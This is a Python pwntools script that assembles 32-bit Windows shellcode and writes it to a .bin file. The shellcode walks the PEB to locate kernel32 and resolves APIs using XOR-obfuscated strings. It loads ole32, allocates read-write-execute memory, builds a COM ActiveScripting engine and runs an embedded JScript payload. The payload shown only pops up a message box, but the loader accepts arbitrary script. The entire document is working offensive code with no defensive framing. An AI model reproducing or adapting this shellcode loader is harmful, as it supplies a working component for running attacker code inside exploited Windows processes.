#!/usr/bin/env python3
from pwn import *
import sys, re

js_payload = '''
var shell = new ActiveXObject("WScript.Shell");
shell.Popup("ActiveScripting was made to torture people");
'''
code = '''

push ebp
mov ebp, esp
sub esp, 0x30
mov eax, [fs:0x30]; PEB addr
mov eax, [eax+0xc]; PEB_LDR_DATA addr
mov eax, [eax+0x14]
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base addr
mov [ebp-4], eax; var4=kerneldll base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; new header addr
mov eax, [eax+0x78]
add eax, [ebp-4]; export table addr
mov [ebp-8], eax; var8=export table
mov eax, [eax+0x20]
add eax, [ebp-4]; name pointer table
mov [ebp-12], eax; var12=name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16= ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-20], eax; var20 = addr table


mov eax, 0xffff8c8c
xor eax, 0xffffffff
push eax
mov eax, 0x9a8d9b9b
xor eax, 0xffffffff
push eax
mov eax, 0xbe9c908d
xor eax, 0xffffffff
push eax
mov eax, 0xaf8b9ab8
xor eax, 0xffffffff
push eax
mov esi, esp; GetProcAddr

xor ecx, ecx
xor eax, eax
xor ebx, ebx
.lp1:
	mov edi, [ebp-12]
	mov edi, [edi+eax*4]
	add edi, [ebp-4]
	xor ecx, ecx
	.lp2:
		mov bl, [esi+ecx]
		mov bh, [edi+ecx]
		test bl, bl
		jz .found
		inc ecx
		cmp bl, bh
		je .lp2
		inc eax
		jmp .lp1

.found:
; eax = index of func
xor ecx, ecx
mov edi, [ebp-16]
mov cx, [edi+2*eax]
mov edi, [ebp-20]
mov eax, [edi+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

add esp, 16; were allocated for string


mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0xbe868d9e
xor eax, 0xffffffff
push eax

mov eax, 0x8d9d96b3
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e90b3
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-12], eax; var12=LoadLibrary
add esp, 16

; WUB WUB

; load ole32.dll

mov eax, 0xffffff93
xor eax, 0xffffffff
push eax

mov eax, 0x939bd1cd
xor eax, 0xffffffff
push eax

mov eax, 0xcc9a9390
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax
add esp, 12

; find CoInitializeEx
mov eax, 0xffff87ba
xor eax, 0xffffffff
push eax

mov eax, 0x9a859693
xor eax, 0xffffffff
push eax

mov eax, 0x9e968b96
xor eax, 0xffffffff
push eax

mov eax, 0x91b690bc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
add esp, 16

; call CoInitializeEx(0, 0)
xor ebx, ebx
push ebx
push ebx
call eax

; find CoCreateInstance
mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9a9c919e
xor eax, 0xffffffff
push eax

mov eax, 0x8b8c91b6
xor eax, 0xffffffff
push eax

mov eax, 0x9a8b9e9a
xor eax, 0xffffffff
push eax

mov eax, 0x8dbc90bc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
add esp, 20

mov [ebp-20], eax


; We need to define functions in rwx memory segment
; Create rwx segment with VirtualAlloc

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9c909393
xor eax, 0xffffffff
push eax

mov eax, 0xbe939e8a
xor eax, 0xffffffff
push eax

mov eax, 0x8b8d96a9
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax

add esp, 16

mov ebx, 0x40
push ebx
mov ebx, 0x00001000
push ebx
mov ebx, 2048
push ebx
xor ebx, ebx
push ebx
call eax
mov [ebp-24], eax; var24 = memory page

; Prepare for CreateInstance(&guid, 0, 1, &IID_IActiveScript, (void **)&engine)
; guid const
mov edi, eax
mov dword ptr [edi], 0xF414C260 
mov word ptr [edi+4], 0x6AC0
mov word ptr [edi+6], 0x11CF
mov byte ptr [edi+8], 0xB6
mov byte ptr [edi+9], 0xD1
mov byte ptr [edi+10], 0x00
mov byte ptr [edi+11], 0xAA
mov byte ptr [edi+12], 0x00
mov byte ptr [edi+13], 0xBB
mov byte ptr [edi+14], 0xBB
mov byte ptr [edi+15], 0x58

add edi, 16
; IID_IActiveScript const
mov dword ptr [edi], 0xbb1a2ae1 
mov word ptr [edi+4], 0xa4f9
mov word ptr [edi+6], 0x11cf
mov byte ptr [edi+8], 0x8F
mov byte ptr [edi+9], 0x20
mov byte ptr [edi+10], 0x00
mov byte ptr [edi+11], 0x80
mov byte ptr [edi+12], 0x5F
mov byte ptr [edi+13], 0x2C
mov byte ptr [edi+14], 0xD0
mov byte ptr [edi+15], 0x64

; define engine and parser in stack
sub esp, 64
mov [ebp-28], esp; var28 = IActiveScript *engine 
sub esp, 64
mov [ebp-32], esp; var32 = IActiveScriptParse *parser 
; call CreateInstance(&guid, 0, 1, &IID_IActiveScript, (void **)&engine)
lea eax, [ebp-28]
push eax
push edi
mov eax, 1
push eax
dec eax
push eax
sub edi, 16
push edi
mov eax, [ebp-20]
call eax

; engine->Query(engine, &IID_IActiveParse, (void **)&parser)
; Prepare
add edi, 16
mov dword ptr [edi], 0xbb1a2ae2 ; IID_IActive -> IID_IActiveParse
lea eax, [ebp-32]
push eax
push edi
mov eax, [ebp-28]
push eax
mov eax, [eax]
call [eax]

; Init parser
; parser->InitNew(parser)
mov eax, [ebp-32]
push eax
mov eax, [eax]
call [eax+12]

; We need to define basic ScriptSite object with several functions
; Create space in stack
mov esi, [ebp-24]
add esi, 1024
mov [ebp-20], esi

; We'll define functions in previously allocated memory
mov edi, [ebp-24]
add edi, 32
; Let's roll
;b8014000
;80c20c00
;58505058
;505031c0
;c20c00eb
;f6ebf1
mov dword ptr [edi], 0x004001b8
mov dword ptr [edi+4], 0x000cc280
mov dword ptr [edi+8], 0x58505058
mov dword ptr [edi+12], 0xc0315050
mov dword ptr [edi+16], 0xeb000cc2
mov dword ptr [edi+20], 0x00f1ebf6


;QueryInterface

mov [esi], edi
add esi, 4
add edi, 8
mov [esi], edi
add esi, 4
mov [esi], edi
add esi, 4
add edi, 3
mov [esi], edi
add esi, 4
mov [esi], edi
add esi, 4
mov [esi], edi
add esi, 4
add edi, 3
mov [esi], edi
add esi, 4
add edi, 5
mov [esi], edi
add esi, 4
mov [esi], edi
add esi, 4
add edi, 2
mov [esi], edi
add esi, 4
mov [esi], edi


lea esi, [ebp-20]
push esi

lea eax, [ebp-28]
mov eax, [eax]
push eax

lea eax, [ebp-28]
mov edx, [eax]
mov edx, [edx]
call [edx+12]

; Looks like it works
; I wanna scream my insides out

; Parse script
; Push it to the stack?
; Do cool hacking trick?
jmp .lol
.back:
pop edi
push edi
; edi has lol address
xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push edi
mov eax, [ebp-32]
push eax
mov eax, [eax]
call [eax+20]

push 2
mov eax, [ebp-28]
push eax
mov eax, [eax]
call [eax+20]

add esp, 128

add esp, 8
add esp, 0x30
pop ebp
ret

.lol:
call .back
'''


js_payload = js_payload.encode('utf-16')[2:]+b'\x00'*16
context.update(arch='i686', bits=32)
# code = open(sys.argv[1], 'r').read()
code = re.sub(';.*\n', '\n', code)
sc = asm(code)
sc +=js_payload

open(sys.argv[1].strip('.asm')+'.bin', 'wb').write(sc)
print("Done!")
